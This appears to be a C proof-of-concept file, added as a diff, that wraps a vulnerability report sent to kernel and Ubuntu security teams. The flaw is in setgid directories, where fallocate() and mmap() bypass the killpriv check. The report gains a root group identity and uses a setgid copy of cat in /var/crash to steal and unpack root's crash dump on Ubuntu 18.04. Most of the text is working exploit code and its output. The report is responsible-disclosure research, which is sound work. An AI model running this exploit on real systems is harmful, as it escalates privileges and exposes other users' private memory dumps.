@@ -1,0 +1,177 @@
+/*
+Note: I am both sending this bug report to security@kernel.org and filing it in
+the Ubuntu bugtracker because I can't tell whether this counts as a kernel bug
+or as a Ubuntu bug. You may wish to talk to each other to determine the best
+place to fix this.
+
+I noticed halfdog's old writeup at
+https://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/
+, describing essentially the following behavior in combination with a
+trick for then writing to the resulting file without triggering the
+killpriv logic:
+
+
+=============
+user@debian:~/sgid_demo$ sudo mkdir -m03777 dir
+user@debian:~/sgid_demo$ cat > demo.c
+#include <fcntl.h>
+int main(void) { open("dir/file", O_RDONLY|O_CREAT, 02755); }
+user@debian:~/sgid_demo$ gcc -o demo demo.c
+user@debian:~/sgid_demo$ ./demo
+user@debian:~/sgid_demo$ ls -l dir/file
+-rwxr-sr-x 1 user root 0 Jun 25 22:03 dir/file
+=============
+
+
+Two patches for this were proposed on LKML back then:
+"[PATCH 1/2] fs: Check f_cred instead of current's creds in
+should_remove_suid()"
+https://lore.kernel.org/lkml/9318903980969a0e378dab2de4d803397adcd3cc.1485377903.git.luto@kernel.org/
+
+"[PATCH 2/2] fs: Harden against open(..., O_CREAT, 02777) in a setgid directory"
+https://lore.kernel.org/lkml/826ec4aab64ec304944098d15209f8c1ae65bb29.1485377903.git.luto@kernel.org/
+
+However, as far as I can tell, neither of them actually landed.
+
+
+You can also bypass the killpriv logic with fallocate() and mmap() -
+fallocate() permits resizing the file without triggering killpriv,
+mmap() permits writing without triggering killpriv (the mmap part is mentioned
+at
+https://lore.kernel.org/lkml/CAGXu5jLu6OGkQUgqRcOyQ6DABOwZ9HX3fUQ+-zC7NjLukGKnVw@mail.gmail.com/
+):
+
+
+=============
+user@debian:~/sgid_demo$ sudo mkdir -m03777 dir
+user@debian:~/sgid_demo$ cat fallocate.c
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <fcntl.h>
+#include <err.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+
+int main(void) {
+  int src_fd = open("/usr/bin/id", O_RDONLY);
+  if (src_fd == -1)
+    err(1, "open 2");
+  struct stat src_stat;
+  if (fstat(src_fd, &src_stat))
+    err(1, "fstat");
+  int src_len = src_stat.st_size;
+  char *src_mapping = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, src_fd, 0);
+  if (src_mapping == MAP_FAILED)
+    err(1, "mmap 2");
+
+  int fd = open("dir/file", O_RDWR|O_CREAT|O_EXCL, 02755);
+  if (fd == -1)
+    err(1, "open");
+  if (fallocate(fd, 0, 0, src_len))
+    err(1, "fallocate");
+  char *mapping = mmap(NULL, src_len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap");
+
+
+  memcpy(mapping, src_mapping, src_len);
+
+  munmap(mapping, src_len);
+  close(fd);
+  close(src_fd);
+
+  execl("./dir/file", "id", NULL);
+  err(1, "execl");
+}
+user@debian:~/sgid_demo$ gcc -o fallocate fallocate.c
+user@debian:~/sgid_demo$ ./fallocate
+uid=1000(user) gid=1000(user) egid=0(root)
+groups=0(root),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(lpadmin),116(scanner),121(wireshark),1000(user)
+=============
+
+
+sys_copy_file_range() also looks as if it bypasses killpriv on
+supported filesystems, but I haven't tested that one so far.
+
+On Ubuntu 18.04 (bionic), /var/crash is mode 03777, group "whoopsie", and
+contains group-readable crashdumps in some custom format, so you can use this
+issue to steal other users' crashdumps:
+
+
+=============
+user@ubuntu-18-04-vm:~$ ls -l /var/crash
+total 296
+-rw-r----- 1 user whoopsie  16527 Jun 25 22:27 _usr_bin_apport-unpack.1000.crash
+-rw-r----- 1 root whoopsie  50706 Jun 25 21:51 _usr_bin_id.0.crash
+-rw-r----- 1 user whoopsie  51842 Jun 25 21:42 _usr_bin_id.1000.crash
+-rw-r----- 1 user whoopsie 152095 Jun 25 21:43 _usr_bin_strace.1000.crash
+-rw-r----- 1 root whoopsie  18765 Jun 26 00:42 _usr_bin_xattr.0.crash
+user@ubuntu-18-04-vm:~$ cat /var/crash/_usr_bin_id.0.crash
+cat: /var/crash/_usr_bin_id.0.crash: Permission denied
+user@ubuntu-18-04-vm:~$ cat fallocate.c 
+*/
+
+#define _GNU_SOURCE
+#include <stdio.h>
+#include <stdlib.h>
+#include <fcntl.h>
+#include <err.h>
+#include <sys/mman.h>
+#include <sys/stat.h>
+#include <unistd.h>
+#include <string.h>
+
+int main(int argc, char **argv) {
+  if (argc != 2) {
+    printf("usage: ./fallocate <file_to_read>");
+    return 1;
+  }
+  int src_fd = open("/bin/cat", O_RDONLY);
+  if (src_fd == -1)
+    err(1, "open 2");
+  struct stat src_stat;
+  if (fstat(src_fd, &src_stat))
+    err(1, "fstat");
+  int src_len = src_stat.st_size;
+  char *src_mapping = mmap(NULL, src_len, PROT_READ, MAP_PRIVATE, src_fd, 0);
+  if (src_mapping == MAP_FAILED)
+    err(1, "mmap 2");
+
+  unlink("/var/crash/privileged_cat"); /* in case we've already run before */
+  int fd = open("/var/crash/privileged_cat", O_RDWR|O_CREAT|O_EXCL, 02755);
+  if (fd == -1)
+    err(1, "open");
+  if (fallocate(fd, 0, 0, src_len))
+    err(1, "fallocate");
+  char *mapping = mmap(NULL, src_len, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
+  if (mapping == MAP_FAILED)
+    err(1, "mmap");
+  memcpy(mapping, src_mapping, src_len);
+  munmap(mapping, src_len);
+  close(fd);
+
+  execl("/var/crash/privileged_cat", "cat", argv[1], NULL);
+  err(1, "execl");
+}
+
+/*
+user@ubuntu-18-04-vm:~$ gcc -o fallocate fallocate.c
+user@ubuntu-18-04-vm:~$ ./fallocate /var/crash/_usr_bin_id.0.crash > /var/crash/_usr_bin_id.0.crash.stolen
+user@ubuntu-18-04-vm:~$ ls -l /var/crash
+total 384
+-rwxr-sr-x 1 user whoopsie  35064 Jul  3 19:22 privileged_cat
+-rw-r----- 1 user whoopsie  16527 Jun 25 22:27 _usr_bin_apport-unpack.1000.crash
+-rw-r----- 1 root whoopsie  50706 Jun 25 21:51 _usr_bin_id.0.crash
+-rw-r--r-- 1 user whoopsie  50706 Jul  3 19:22 _usr_bin_id.0.crash.stolen
+-rw-r----- 1 user whoopsie  51842 Jun 25 21:42 _usr_bin_id.1000.crash
+-rw-r----- 1 user whoopsie 152095 Jun 25 21:43 _usr_bin_strace.1000.crash
+-rw-r----- 1 root whoopsie  18765 Jun 26 00:42 _usr_bin_xattr.0.crash
+user@ubuntu-18-04-vm:~$ mkdir root_crash_unpacked
+user@ubuntu-18-04-vm:~$ # work around bug in apport-unpack
+user@ubuntu-18-04-vm:~$ sed -i 's|^UserGroups: $|UserGroups: 0|' /var/crash/_usr_bin_id.0.crash.stolen
+user@ubuntu-18-04-vm:~$ apport-unpack /var/crash/_usr_bin_id.0.crash.stolen root_crash_unpacked/
+user@ubuntu-18-04-vm:~$ file root_crash_unpacked/CoreDump 
+root_crash_unpacked/CoreDump: ELF 64-bit LSB core file x86-64, version 1 (SYSV), SVR4-style, from 'id', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: '/usr/bin/id', platform: 'x86_64'
+*/
